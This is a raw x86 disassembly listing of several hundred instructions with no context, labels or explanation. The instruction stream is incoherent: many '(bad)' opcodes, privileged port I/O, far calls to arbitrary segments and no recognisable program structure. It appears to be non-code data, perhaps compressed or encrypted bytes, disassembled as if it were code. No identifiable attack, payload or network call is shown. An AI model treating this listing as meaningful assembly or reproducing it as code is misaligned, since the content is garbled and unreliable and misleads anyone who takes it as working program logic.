  419cce:	and    dh,BYTE PTR [edx+ebp*4+0x5d999941]
  419cd5:	push   0x5b
  419cd7:	inc    edi
  419cd8:	ins    DWORD PTR es:[edi],dx
  419cd9:	sbb    DWORD PTR [edi],esi
  419cdb:	sub    edx,eax
  419cdd:	jo     0x419d2c
  419cdf:	sub    al,0x61
  419ce1:	add    eax,0x782fc5ff
  419ce6:	xchg   esp,eax
  419ce7:	out    dx,eax
  419ce8:	or     eax,0x6067c75e
  419ced:	(bad)  
  419cee:	out    0x37,eax
  419cf0:	mov    eax,0x824bcf74
  419cf5:	dec    ebx
  419cf6:	sbb    ecx,DWORD PTR [eax-0x1760416b]
  419cfc:	pop    edx
  419cfd:	and    ah,BYTE PTR [ecx+0x30690537]
  419d03:	into   
  419d04:	ja     0x419d7b
  419d06:	mov    bl,0xbf
  419d08:	into   
  419d09:	in     eax,dx
  419d0a:	mov    esp,0x660fa4d5
  419d0f:	pop    ecx
  419d10:	dec    esi
  419d11:	pop    ds
  419d12:	mov    esp,0x743e8546
  419d17:	mov    fs,WORD PTR [esi]
  419d19:	xor    DWORD PTR [ebp+0x23e5692d],ebp
  419d1f:	sub    al,0xc9
  419d21:	ja     0x419ca4
  419d23:	(bad)  
  419d24:	fsubrp st(1),st
  419d26:	mov    ch,0xce
  419d28:	inc    ecx
  419d29:	jne    0x419cfd
  419d2b:	lock mov eax,ds:0xa627fdf1
  419d31:	adc    eax,0x8997a29
  419d36:	and    BYTE PTR [edi+0x31f66db6],0xb8
  419d3d:	(bad)  
  419d3e:	out    dx,eax
  419d3f:	and    ebp,esp
  419d41:	jo     0x419db1
  419d43:	(bad)
  419d46:	sub    DWORD PTR [esi+0x172ac979],0x50b1bcd5
  419d50:	int3   
  419d51:	dec    ecx
  419d52:	push   ss
  419d53:	das    
  419d54:	ins    BYTE PTR es:[edi],dx
  419d55:	je     0x419d60
  419d57:	jmp    0x419d4d
  419d59:	cmp    dl,dl
  419d5b:	ja     0x419d7b
  419d5d:	cmc    
  419d5e:	jae    0x419d3f
  419d60:	inc    esi
  419d61:	pop    edx
  419d62:	pop    ebx
  419d63:	ret    
  419d64:	in     al,dx
  419d65:	add    eax,0xcec90afd
  419d6a:	js     0x419d1f
  419d6c:	inc    esp
  419d6d:	and    DWORD PTR [edi-0x23],0xd3fc7674
  419d74:	les    ebx,FWORD PTR ds:0x9d472cd5
  419d7a:	add    eax,0x4f921c6d
  419d7f:	or     DWORD PTR [ebp-0x25],ecx
  419d82:	out    0x6,al
  419d84:	push   ds
  419d85:	test   BYTE PTR [ebp+0x2d],dh
  419d88:	cli    
  419d89:	cmp    esi,ecx
  419d8b:	in     eax,dx
  419d8c:	mov    ah,0xeb
  419d8e:	(bad)  [ebp+0x49]
  419d91:	push   0x41fb70ef
  419d96:	push   esp
  419d97:	dec    eax
  419d98:	iret   
  419d99:	out    0x72,al
  419d9b:	sub    al,0x6c
  419d9d:	mov    cs,WORD PTR [edi+0x43]
  419da0:	cvtps2pi mm6,QWORD PTR [esi+0x57]
  419da4:	pop    ecx
  419da5:	push   esi
  419da6:	pop    eax
  419da7:	and    ecx,esp
  419da9:	adc    DWORD PTR [ebx],eax
  419dab:	sub    DWORD PTR [edx],edi
  419dad:	mov    edi,0xa8338a9
  419db2:	lds    ebx,FWORD PTR [esi+0x1c]
  419db5:	bound  ebp,QWORD PTR [esi]
  419db7:	sbb    bh,BYTE PTR [eax]
  419db9:	sub    ebx,DWORD PTR [edi-0x65347026]
  419dbf:	into   
  419dc0:	leave  
  419dc1:	sbb    bl,al
  419dc3:	loop   0x419d5b
  419dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dc6:	dec    eax
  419dc7:	pmulhw mm3,QWORD PTR [eax-0x7d]
  419dcb:	(bad)  
  419dcc:	shr    DWORD PTR [esi],1
  419dce:	scas   al,BYTE PTR es:[edi]
  419dcf:	enter  0x467b,0x78
  419dd3:	scas   eax,DWORD PTR es:[edi]
  419dd4:	test   dl,0x1b
  419dd7:	mov    fs,WORD PTR [esi]
  419dd9:	push   esp
  419dda:	test   al,0x2e
  419ddc:	xchg   DWORD PTR [edx-0xf97b244],ebp
  419de2:	fild   DWORD PTR [edi+0x2d45225f]
  419de8:	and    edx,ecx
  419dea:	mov    ch,0xd7
  419dec:	cmp    DWORD PTR [eax+0xe9d7805],ebx
  419df2:	pop    edi
  419df3:	shl    BYTE PTR [edx-0x7e90af26],1
  419df9:	cmp    ecx,esi
  419dfb:	lock xor eax,0xd5dd5afd
  419e01:	bound  eax,QWORD PTR gs:[edx+0x6a439ba7]
  419e08:	scas   al,BYTE PTR es:[edi]
  419e09:	rcr    edx,0xc7
  419e0c:	addr16 psrld mm4,mm7
  419e10:	cmp    esp,DWORD PTR [edx-0x2d59a0c5]
  419e16:	or     BYTE PTR [eax+ebp*1],dh
  419e19:	test   eax,0x14b93282
  419e1e:	xor    BYTE PTR [eax+0x6],dl
  419e21:	push   0x5d
  419e23:	and    al,0x91
  419e25:	xchg   ebx,eax
  419e26:	cmc    
  419e27:	sbb    al,al
  419e29:	mov    esp,esi
  419e2b:	and    eax,0x618a4499
  419e30:	jmp    0x419e42
  419e32:	or     eax,0x23ba7905
  419e37:	mov    al,0x19
  419e39:	in     al,dx
  419e3a:	lods   eax,DWORD PTR ds:[esi]
  419e3b:	fs inc eax
  419e3d:	adc    ebp,DWORD PTR [edx+esi*4]
  419e40:	adc    ah,BYTE PTR [eax]
  419e42:	enter  0x874e,0xc7
  419e46:	out    0xed,eax
  419e48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e49:	ret    0x1ee2
  419e4c:	mov    ah,0xa6
  419e4e:	inc    eax
  419e4f:	call   0xbff4cd9b
  419e54:	mov    al,ds:0xdbd837d3
  419e59:	cmc    
  419e5a:	dec    edi
  419e5b:	mov    cl,0xb9
  419e5d:	str    WORD PTR [edx]
  419e60:	jge    0x419ebb
  419e62:	lods   eax,DWORD PTR ds:[esi]
  419e63:	imul   edi,esp,0xffffffb9
  419e66:	jns    0x419e08
  419e68:	mov    bl,0x92
  419e6a:	pop    edx
  419e6b:	data16 std 
  419e6d:	and    cl,bl
  419e6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e70:	rol    esi,1
  419e72:	dec    ebp
  419e73:	fs cmp edx,ecx
  419e76:	jle    0x419e73
  419e78:	inc    edx
  419e79:	repnz xor DWORD PTR es:[ebx+esi*8-0xb],ebp
  419e7f:	data16 jle 0x419e46
  419e82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e83:	(bad)  
  419e84:	(bad)  [edi-0x39217ee6]
  419e8a:	test   eax,0x9087377f
  419e8f:	dec    esp
  419e90:	ds mov edi,0x2e41e64c
  419e96:	ins    DWORD PTR es:[edi],dx
  419e97:	inc    DWORD PTR [esi]
  419e99:	mov    dl,0x12
  419e9b:	sbb    cl,BYTE PTR [ebp-0x4f]
  419e9e:	pop    esp
  419e9f:	pop    ecx
  419ea0:	mov    WORD PTR [ebx],ss
  419ea2:	lock lods al,BYTE PTR ds:[si]
  419ea5:	adc    ch,BYTE PTR [ecx+0x2f0a7b5f]
  419eab:	or     eax,DWORD PTR [eax-0x65c0f75f]
  419eb1:	cld    
  419eb2:	mov    ebx,0xcbffb83f
  419eb7:	in     eax,dx
  419eb8:	xchg   ebx,eax
  419eb9:	into   
  419eba:	dec    ecx
  419ebb:	push   edx
  419ebc:	pop    ds
  419ebd:	aas    
  419ebe:	(bad)  
  419ec0:	imul   edx,DWORD PTR [eax],0x10
  419ec3:	pop    ebx
  419ec4:	inc    esi
  419ec5:	xor    eax,0xa6967f6a
  419eca:	mov    al,0xb6
  419ecc:	nop
  419ecd:	aad    0xc7
  419ecf:	or     ecx,DWORD PTR ds:0xf562535a
  419ed5:	mov    bl,0x62
  419ed7:	out    0xf5,al
  419ed9:	mov    dl,al
  419edb:	jge    0x419f48
  419edd:	adc    eax,0xe4c634f3
  419ee2:	pop    esi
  419ee3:	and    BYTE PTR [edi+eax*1+0x523c7642],cl
  419eea:	sar    ah,0x26
  419eed:	mov    ah,0x3b
  419eef:	add    eax,DWORD PTR [ebx-0x77]
  419ef2:	aad    0x43
  419ef4:	(bad)  
  419ef5:	mov    ch,BYTE PTR [edi]
  419ef7:	test   edi,esi
  419ef9:	ret    0xa712
  419efc:	ss sbb ebp,esi
  419eff:	jg     0x419ea6
  419f01:	cmp    al,0x30
  419f03:	out    0xcf,eax
  419f05:	add    ch,bl
  419f07:	or     ebp,DWORD PTR [edx-0x4ade8a74]
  419f0d:	int    0x1c
  419f0f:	dec    ebx
  419f10:	pop    ecx
  419f11:	mov    ds:0xad6ec1a9,al
  419f17:	mov    al,ds:0x3fdfbe2c
  419f1c:	enter  0x4822,0x19
  419f20:	mov    dh,0xa7
  419f22:	cmp    eax,0xa5cee454
  419f27:	cmp    BYTE PTR [ebp+0x2b7e5b54],dh
  419f2d:	dec    eax
  419f2e:	or     bl,0xcd
  419f31:	xchg   edi,edx
  419f33:	dec    esi
  419f34:	arpl   WORD PTR [edx-0x11],cx
  419f37:	inc    ebx
  419f38:	mov    edi,0xa6bdf95e
  419f3d:	gs jae 0x419ed6
  419f40:	push   eax
  419f41:	pop    ecx
  419f42:	ret    0x25a5
  419f45:	mov    ebx,0x83a58755
  419f4a:	sbb    DWORD PTR [ecx],edx
  419f4c:	pop    ss
  419f4d:	pop    ebx
  419f4e:	sbb    esp,DWORD PTR [ebx]
  419f50:	sar    DWORD PTR [edi+0x70],1
  419f53:	add    bl,ah
  419f55:	jns    0x419fac
  419f57:	or     BYTE PTR [ebp+0x1d],ah
  419f5a:	push   ebx
  419f5b:	and    al,0xbd
  419f5d:	mov    ch,0xa5
  419f5f:	inc    eax
  419f60:	dec    ebx
  419f61:	add    eax,0xddb17cc6
  419f66:	xchg   ebx,eax
  419f67:	fcmovnu st,st(5)
  419f69:	(bad)  
  419f6a:	imul   edi,DWORD PTR [ebx],0x27
  419f6d:	push   esp
  419f6e:	(bad)  
  419f6f:	dec    edx
  419f70:	jmp    0xd74d:0x9a2abc32
  419f77:	inc    ecx
  419f78:	inc    ebx
  419f79:	daa    
  419f7a:	cmp    eax,0x32765e30
  419f7f:	sub    eax,0x4739956b
  419f84:	jne    0x419fbd
  419f86:	pushf  
  419f87:	jle    0x419f0e
  419f89:	fs cli 
  419f8b:	loopne 0x419fc5
  419f8d:	call   DWORD PTR [edx+0x12c0c419]
  419f93:	fisub  WORD PTR [ebx+eax*8+0x7b7949e8]
  419f9a:	lea    edi,[ecx]
  419f9c:	mov    dl,0x2c
  419f9e:	pop    ecx
  419f9f:	mov    dh,0x9a
  419fa1:	inc    ecx
  419fa2:	push   0x1b
  419fa4:	shl    BYTE PTR es:[eax-0x36],0x48
  419fa9:	jle    0x419f45
  419fab:	add    BYTE PTR [ecx],dh
  419fad:	xor    dl,BYTE PTR [ebp+0x229fc112]
  419fb3:	ret    0x81ad
  419fb6:	jnp    0x419fe2
  419fb8:	sub    bl,ch
  419fba:	pop    esi
  419fbb:	jl     0x41a006
  419fbd:	pop    edi
  419fbe:	ja     0x419ff0
  419fc0:	mov    ch,0x52
  419fc2:	xor    dh,dl
  419fc4:	add    eax,0xc3d16eda
  419fc9:	lds    ecx,FWORD PTR fs:0xb8792f12
  419fd0:	pushf  
  419fd1:	ins    BYTE PTR es:[edi],dx
  419fd2:	adc    eax,0x48a5f77d
  419fd7:	adc    BYTE PTR [ebp+0x60],ah
  419fda:	xor    cl,al
  419fdc:	adc    BYTE PTR [edi-0x314f3b95],0x8a
  419fe3:	lahf   
  419fe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fe5:	sbb    BYTE PTR [edi-0x6f31abfb],ah
  419feb:	repz mov fs,WORD PTR [ecx+0x4accad28]
  419ff2:	sub    al,0x66
  419ff4:	sub    al,0xc
  419ff6:	dec    ecx
  419ff7:	in     eax,0x5d
  419ff9:	jno    0x419fae
  419ffb:	pusha  
  419ffc:	sub    bh,BYTE PTR [ebx]
  419ffe:	inc    ecx
  419fff:	es inc esi
  41a001:	jmp    0x419f9c
  41a003:	xor    dl,dh
  41a005:	out    0xdd,eax
  41a007:	test   BYTE PTR [eax+0x4],dh
  41a00a:	push   es
  41a00b:	cli    
  41a00c:	fsubr  DWORD PTR [eax+0x4c3342d6]
  41a012:	jbe    0x41a090
  41a014:	fild   WORD PTR [ecx-0x18dc3c16]
  41a01a:	dec    eax
  41a01b:	retf   0x5b2f
  41a01e:	fbstp  TBYTE PTR [edx]
  41a020:	xor    esi,ecx
  41a022:	add    eax,0xec98f794
  41a027:	ror    DWORD PTR cs:[esi],1
  41a02a:	call   DWORD PTR [edx]
  41a02c:	repz and cl,BYTE PTR [edi-0x2fbb9fb0]
  41a033:	cmp    al,0xd0
  41a035:	repz repnz mov WORD PTR gs:[eax-0x2863931c],ss
  41a03e:	push   0xd51aa4e7
  41a043:	outs   dx,BYTE PTR ds:[esi]
  41a044:	mov    al,ds:0x4bee49f7
  41a049:	or     edx,edx
  41a04b:	xlat   BYTE PTR ds:[ebx]
  41a04c:	sar    BYTE PTR [ebx],cl
  41a04e:	ins    DWORD PTR es:[edi],dx
  41a04f:	in     eax,0x87
  41a051:	(bad)  
  41a052:	ds push 0x8cdc73e
  41a058:	sbb    DWORD PTR [ebx+edi*1-0x64d3d418],esi
  41a05f:	dec    edx
  41a060:	inc    esp
  41a061:	pop    bx
  41a063:	pop    esp
  41a064:	je     0x41a098
  41a066:	shr    DWORD PTR ds:0x902f6cb4,1
  41a06c:	pop    ds
  41a06d:	imul   edi,edx,0x4a11f9a8
  41a073:	mov    edi,0x5818a5cc
  41a078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a079:	add    ch,ch
  41a07b:	pop    edx
  41a07c:	daa    
  41a07d:	fistp  DWORD PTR [edi+0x75]
  41a080:	lods   al,BYTE PTR ds:[esi]
  41a081:	xor    eax,0x32cddf9d
  41a086:	or     bh,al
  41a088:	jle    0x41a053
  41a08a:	sbb    DWORD PTR [edx+0x3a50de1f],0x4930d73d
  41a094:	sub    eax,0x7c1f373b
  41a099:	aad    0x72
  41a09b:	addr16 and al,0x84
  41a09e:	push   esi
  41a09f:	pop    ebp
  41a0a0:	fld    DWORD PTR ds:0xec66d7d
  41a0a6:	adc    al,0x7c
  41a0a8:	mov    ebx,0x86346675
  41a0ad:	sbb    ebx,DWORD PTR [edi-0x5c]
  41a0b0:	out    dx,eax
  41a0b1:	inc    ebp
  41a0b2:	jl     0x41a06d
  41a0b4:	clc    
  41a0b5:	cmc    
  41a0b6:	mov    esp,0x1da609e1
  41a0bb:	xchg   edx,eax
  41a0bc:	repnz icebp 
  41a0be:	adc    al,0xf1
  41a0c0:	iret   
  41a0c1:	mov    ebp,0x305cb83
  41a0c6:	dec    eax
  41a0c7:	in     eax,dx
  41a0c8:	les    esp,FWORD PTR [ebp+0x63754934]
  41a0ce:	xor    al,0xf6
  41a0d0:	push   esp
  41a0d1:	sub    dh,BYTE PTR [ebx-0x4d2445dd]
  41a0d7:	jbe    0x41a13d
  41a0d9:	dec    esp
  41a0da:	cmp    BYTE PTR [esi-0xa],ch
  41a0dd:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a0df:	push   ds
  41a0e0:	xor    DWORD PTR [esi-0x7a84159a],edx
  41a0e6:	push   esi
  41a0e7:	push   ebx
  41a0e8:	push   edi
  41a0e9:	add    BYTE PTR [ebx+0x63d662c1],cl
  41a0ef:	mov    DWORD PTR [eax-0x462ac986],esp
  41a0f5:	cmp    BYTE PTR [ebp+0xb],0x72
  41a0f9:	and    bh,BYTE PTR [edi+0x3c]
  41a0fc:	cmp    al,bl
  41a0fe:	scas   eax,DWORD PTR es:[edi]
  41a0ff:	das    
  41a100:	mov    dh,0x54
  41a102:	out    0x31,eax
  41a104:	mov    dl,0xca
  41a106:	push   0xffffffa6
  41a108:	or     eax,0x4491c2c
  41a10d:	push   ds
  41a10e:	in     al,dx
  41a10f:	loop   0x41a137
  41a111:	dec    esp
  41a112:	adc    dh,BYTE PTR [edi+0x12578c3d]
  41a118:	shl    ch,0x8e
  41a11b:	inc    ecx
  41a11c:	cmp    eax,0xcefe28cc
  41a121:	push   edx
  41a122:	mov    esp,0x920792a1
  41a127:	clc    
  41a128:	jbe    0x41a149
  41a12a:	add    BYTE PTR [edi],0xd8
  41a12d:	into   
  41a12e:	add    eax,DWORD PTR [edi+ebp*4]
  41a131:	mov    edx,0x7fd58e1e
  41a136:	call   0x684:0x2a6ad95a
  41a13d:	sbb    al,0x28
  41a13f:	pop    ds
  41a140:	retf   0xc6ec
  41a143:	test   al,0x9
  41a145:	adc    eax,DWORD PTR [ecx+0x54]
  41a148:	adc    DWORD PTR [ebp-0x368c3077],eax
  41a14e:	fst    QWORD PTR [esi-0x3766474c]
  41a154:	repz fadd st(5),st
  41a157:	addr16 add al,0x97
  41a15a:	jle    0x41a12e
  41a15c:	add    al,0xf4
  41a15e:	sahf   
  41a15f:	jecxz  0x41a1b1
  41a161:	add    eax,0xdd83e74f
  41a166:	je     0x41a162
  41a168:	push   cs
  41a169:	sub    BYTE PTR [edx+edx*1+0x1a],ch
  41a16d:	cdq    
  41a16e:	mov    ebx,0x6d4313fe
  41a173:	cs cdq 
  41a175:	push   es
  41a176:	je     0x41a123
  41a178:	push   es
  41a179:	jb     0x41a1db
  41a17b:	fwait
  41a17c:	icebp  
  41a17d:	in     eax,0xbd
  41a17f:	add    esi,eax
  41a181:	mov    esi,0x1ea29828
  41a186:	lods   eax,DWORD PTR ds:[esi]
  41a187:	jne    0x41a195
  41a189:	es out dx,al
  41a18b:	dec    edx
  41a18c:	mov    esp,0xd8398f69
  41a191:	ret    
  41a192:	pop    ss
  41a193:	push   esi
  41a194:	pop    esi
  41a195:	test   DWORD PTR [esi+0x1d14c182],esp
  41a19b:	push   edx
  41a19c:	(bad)  
  41a19d:	stc    
  41a19e:	push   edx
  41a19f:	mov    dh,0x33
  41a1a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1a2:	mov    ch,BYTE PTR [esi-0x1b123b43]
  41a1a8:	mov    dh,0x33
  41a1aa:	pop    ds
  41a1ab:	adc    eax,0x680082d9
  41a1b0:	mov    dl,0xf
  41a1b2:	xchg   esi,eax
  41a1b3:	into   
  41a1b4:	xor    esp,esi
  41a1b6:	push   0xbc3b66d8
  41a1bb:	hlt    
  41a1bc:	icebp  
  41a1bd:	scas   al,BYTE PTR es:[edi]
  41a1be:	and    eax,0x502dae4e
  41a1c3:	sbb    DWORD PTR [esi],esp
  41a1c5:	fs in  al,0x4b
  41a1c8:	xchg   edi,eax
  41a1c9:	sub    eax,0x28353a85
  41a1ce:	jge    0x41a166
  41a1d0:	pushf  
  41a1d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1d2:	lahf   
  41a1d3:	push   eax
  41a1d4:	pop    ss
  41a1d5:	push   ss
  41a1d6:	inc    edi
  41a1d7:	inc    eax
  41a1d8:	inc    esi
  41a1d9:	inc    esp
  41a1da:	scas   eax,DWORD PTR es:[edi]
  41a1db:	and    ecx,DWORD PTR [edi+edx*8]
  41a1de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1df:	cmp    al,0xa4
  41a1e1:	daa    
  41a1e2:	add    DWORD PTR [eax],0x11
  41a1e5:	bound  esp,QWORD PTR [ebx+0x34]
  41a1e8:	mov    al,BYTE PTR [esi*4+0x17597fe]
  41a1ef:	and    al,0x12
  41a1f1:	icebp  
  41a1f2:	and    eax,0xb7de177f
  41a1f7:	inc    eax
  41a1f8:	xchg   DWORD PTR [edx-0x70],esi
  41a1fb:	or     eax,0x660f0c3b
  41a200:	xchg   ebp,eax
  41a201:	add    esi,DWORD PTR [esi+eiz*2]
  41a204:	jl     0x41a248
  41a206:	je     0x41a1f0
  41a208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a209:	inc    ebx
  41a20a:	call   0x2c80d85d
  41a20f:	cmp    DWORD PTR [ecx-0x10],esp
  41a212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a213:	dec    esp
  41a214:	push   ecx
  41a215:	sbb    eax,0x4f335537
  41a21a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a21b:	sti    
  41a21c:	das    
  41a21d:	out    0xf8,al
  41a21f:	(bad)  
  41a220:	pop    esp
  41a221:	inc    eax
  41a222:	or     ch,BYTE PTR ds:0x88bf82da
  41a228:	cmp    BYTE PTR [ecx],cl
  41a22a:	or     eax,0x3e072983
  41a22f:	inc    ecx
  41a230:	or     BYTE PTR [ebp-0x2c23f647],ah
  41a236:	das    
  41a237:	adc    edi,0xca773763
  41a23d:	(bad)  
  41a23e:	sahf   
  41a23f:	and    DWORD PTR [edi-0x10],0xffffffda
  41a243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a244:	add    al,0x72
  41a246:	xchg   esi,eax
  41a247:	jnp    0x41a2c7
  41a249:	pop    eax
  41a24a:	push   cs
  41a24b:	(bad)  [esi-0x62]
  41a24e:	push   ecx
  41a24f:	mov    ecx,0x45bfc36
  41a254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a255:	ja     0x41a1ed
  41a257:	inc    ebx
  41a258:	out    dx,eax
  41a259:	or     eax,0x2808af55
  41a25e:	aad    0xe7
  41a260:	rcr    eax,1
  41a262:	add    bl,BYTE PTR [ecx]
  41a264:	icebp  
  41a265:	or     dl,bh
  41a267:	je     0x41a2a3
  41a269:	xchg   ebx,eax
  41a26a:	xchg   ebx,eax
  41a26b:	sub    edi,DWORD PTR [ecx+eax*8-0x8]
  41a26f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a270:	jne    0x41a258
  41a272:	add    dl,BYTE PTR ds:0x4c5c0248
  41a278:	sbb    eax,0xba7b7ca0
  41a27d:	ins    DWORD PTR es:[edi],dx
  41a27e:	imul   edi,DWORD PTR [ebp-0x5c],0xb4d85a9c
  41a285:	rcl    DWORD PTR [ebx+0x2d],0x2f
  41a289:	and    al,0xa6
  41a28b:	retf   0x83a
  41a28e:	adc    eax,0x5bd908ba
  41a293:	or     eax,0x8cdde4d4
  41a298:	push   0x80d6daa9
  41a29d:	test   BYTE PTR es:[ecx],dl
  41a2a0:	dec    edx
  41a2a1:	bound  ebp,QWORD PTR [ebx+0x2d72636e]
  41a2a7:	pop    ds
  41a2a8:	inc    ecx
  41a2a9:	stos   DWORD PTR es:[edi],eax
  41a2aa:	out    dx,al
  41a2ab:	xchg   esp,eax
  41a2ac:	cmp    edx,DWORD PTR [edx]
  41a2ae:	sub    DWORD PTR [ecx],0xffffffec
  41a2b1:	imul   esi,eax,0x4db19e64
  41a2b7:	enter  0xebb0,0x4a
  41a2bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2bc:	sbb    al,0x51
  41a2be:	scas   al,BYTE PTR es:[edi]
  41a2bf:	inc    ebp
  41a2c0:	pushf  
  41a2c1:	test   al,bh
  41a2c3:	or     esp,0x3c0eee80
  41a2c9:	mov    BYTE PTR [esi],ah
  41a2cb:	dec    ecx
  41a2cc:	out    dx,al
  41a2cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ce:	pop    ds
  41a2cf:	shl    BYTE PTR [eax-0x26e93c2b],1
  41a2d5:	mov    BYTE PTR [ebp-0x1f885685],ah
  41a2db:	pop    ebp
  41a2dc:	std    
  41a2dd:	pop    ds
  41a2de:	cmp    al,BYTE PTR [ebp+0x41]
  41a2e1:	sar    BYTE PTR [ecx-0x3f],0x91
  41a2e5:	aas    
  41a2e6:	stos   BYTE PTR es:[edi],al
  41a2e7:	ins    DWORD PTR es:[edi],dx
  41a2e8:	push   es
  41a2e9:	xor    esp,DWORD PTR [ebx]
  41a2eb:	push   ecx
  41a2ec:	fcmovnu st,st(2)
  41a2ee:	jno    0x41a2b1
  41a2f0:	mov    al,ds:0x4d748070
  41a2f5:	loope  0x41a353
  41a2f7:	mov    esp,0xff614ebe
  41a2fc:	(bad)  
  41a2fd:	std    
  41a2fe:	fld    QWORD PTR [ebx-0x5c]
  41a301:	js     0x41a2c4
  41a303:	inc    edi
  41a304:	hlt    
  41a305:	mov    ecx,0x229f3239
  41a30a:	and    ebx,DWORD PTR [edi+0xf61dd4a]
  41a310:	(bad)  
  41a311:	push   esi
  41a312:	call   FWORD PTR ds:0xb7cc6940
  41a318:	xchg   BYTE PTR [edx],bl
  41a31a:	sar    ecx,cl
  41a31c:	sub    BYTE PTR [eax+ebx*4],0xf3
  41a320:	scas   eax,DWORD PTR es:[edi]
  41a321:	adc    ch,al
  41a323:	add    BYTE PTR [esi+0x4dee097e],bh
  41a329:	push   ss
  41a32a:	arpl   WORD PTR [ebp-0xb311910],ax
  41a330:	test   DWORD PTR [edi+0x19f705db],esi
  41a336:	(bad)  
  41a338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a339:	pop    ds
  41a33a:	jle    0x41a305
  41a33c:	push   ebp
  41a33d:	mov    esp,0x2c1065eb
  41a342:	gs xchg ecx,eax
  41a344:	xor    eax,0xd660fabf
  41a349:	dec    esp
  41a34a:	shr    DWORD PTR [edi-0x1d],cl
  41a34d:	mov    eax,ds:0x89c4d443
  41a352:	pop    es
  41a353:	rcl    al,cl
  41a355:	test   BYTE PTR [esi],al
  41a357:	ret    
  41a358:	push   esi
  41a359:	icebp  
  41a35a:	jae    0x41a346
  41a35c:	fcmovnu st,st(3)
  41a35e:	fwait
  41a35f:	adc    eax,0xec75c44a
  41a364:	jmp    0x954feeac
  41a369:	dec    edx
  41a36a:	ret    0x54d9
  41a36d:	push   ecx
  41a36e:	mov    eax,DWORD PTR [eax-0x7360ac99]
  41a374:	sub    dl,BYTE PTR [bx+di-0x60]
  41a378:	jge    0x41a329
  41a37a:	push   ecx
  41a37b:	mov    al,0x7d
  41a37d:	xchg   edi,eax
  41a37e:	inc    edi
  41a37f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a380:	lds    eax,FWORD PTR [eax]
  41a382:	ret    0x923a
  41a385:	push   ds
  41a386:	cld    
  41a387:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a388:	dec    eax
  41a389:	mov    ds:0x2eb62c7c,al
  41a38e:	cmp    DWORD PTR [eax-0x2b],ecx
  41a391:	mov    eax,0x6e211907
  41a396:	and    DWORD PTR [ebx+0x36],eax
  41a399:	push   ecx
  41a39a:	xor    cl,al
  41a39c:	rcr    dl,cl
  41a39e:	sahf   
  41a39f:	push   ss
  41a3a0:	adc    eax,0xc8100732
  41a3a5:	retf   
  41a3a6:	xchg   BYTE PTR [edi-0x1b],bl
  41a3a9:	scas   eax,DWORD PTR es:[edi]
  41a3aa:	inc    esi
  41a3ab:	shl    DWORD PTR [eax+0x4a],1
  41a3ae:	daa    
  41a3af:	and    eax,0xc8c2ec52
  41a3b4:	call   0x9893:0x7e71340d
  41a3bb:	add    DWORD PTR [eax+0x2e98a6d8],edi
  41a3c1:	fs pop esi
  41a3c3:	out    dx,eax
  41a3c4:	dec    esi
  41a3c5:	addr16 mov al,ds:0x62ed
  41a3c9:	lahf   
  41a3ca:	addr16 out 0x12,eax
  41a3cd:	mov    ds:0xc8b0b402,al
  41a3d2:	and    BYTE PTR [esi],bl
  41a3d4:	mov    edi,0xba2522d6
  41a3d9:	ss clc 
  41a3db:	inc    ebx
  41a3dc:	dec    esp
  41a3dd:	les    eax,FWORD PTR [eax-0x3]
  41a3e0:	call   0x1e6b:0xd7ab6f3b
  41a3e7:	push   0x73a6f0ea
  41a3ec:	inc    ebp
  41a3ed:	(bad)  
  41a3ef:	lods   al,BYTE PTR ds:[esi]
  41a3f0:	mov    al,0xc1
  41a3f2:	adc    BYTE PTR [eax],0x6a
  41a3f5:	das    
  41a3f6:	nop
  41a3f7:	mov    eax,0xa5097dda
  41a3fc:	adc    dl,BYTE PTR [esp+ebx*2-0x92cbb79]
  41a403:	dec    esi
  41a404:	mov    ah,BYTE PTR [ebx]
  41a406:	mov    dh,0xd4
  41a408:	pop    es
  41a409:	mov    ebp,0xa015c5dc
  41a40e:	cmp    DWORD PTR [edi+0x2d],ebp
  41a411:	jle    0x41a487
  41a413:	push   esi
  41a414:	bound  esp,QWORD PTR [edx]
  41a416:	pop    ss
  41a417:	sub    DWORD PTR [edi],ecx
  41a419:	and    ebp,DWORD PTR [ebp+0x33]
  41a41c:	mov    es,esp
  41a41e:	xchg   BYTE PTR [edi],dh
  41a420:	jmp    0x41a430
  41a422:	fnsave [ecx+ecx*4]
  41a425:	lods   al,BYTE PTR ds:[esi]
  41a426:	popa   
  41a427:	xchg   BYTE PTR [esi-0x4ac81fb9],bl
  41a42d:	push   0x75
  41a42f:	stos   BYTE PTR es:[edi],al
  41a430:	sub    dl,BYTE PTR [ebx+eax*1]
  41a433:	les    esi,FWORD PTR [ecx-0x18]
  41a436:	push   esi
  41a437:	sub    al,0x4d
  41a439:	xchg   edi,eax
  41a43a:	ror    BYTE PTR [edx],0x9c
  41a43d:	xchg   esp,eax
  41a43e:	pushf  
  41a43f:	xchg   ecx,eax
  41a440:	gs jmp 0xda31de5f
  41a446:	push   0xffffffe1
  41a448:	fdiv   st(0),st
  41a44a:	adc    bh,BYTE PTR [eax-0x79]
  41a44d:	jecxz  0x41a483
  41a44f:	xchg   ecx,eax
  41a450:	fld    QWORD PTR [esi+esi*4+0x3e175661]
  41a457:	pop    edi
  41a458:	sub    eax,edi
  41a45a:	dec    ebp
  41a45b:	mov    esp,0xa382b0b1
